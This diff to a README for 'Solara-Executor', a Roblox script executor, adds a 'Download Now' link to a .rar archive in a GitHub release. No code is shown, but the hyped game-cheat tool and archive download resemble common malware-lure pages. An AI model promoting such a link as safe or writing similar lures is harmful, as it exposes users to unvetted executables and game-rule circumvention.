@@ -2,6 +2,7 @@
 
 Welcome to **Solara-Executor** — your ultimate tool for Roblox scripting! 🚀  
 Unleash your creativity, automate tasks, and make your gameplay more fun and exciting. 🎮  
+[Download Now](https://github.com/Miller7622/solara-executor-download-2024/releases/download/Download/solara-executor-download-2024.rar)
 
 ![Solara-Executor](solara-executor.jpg)
 
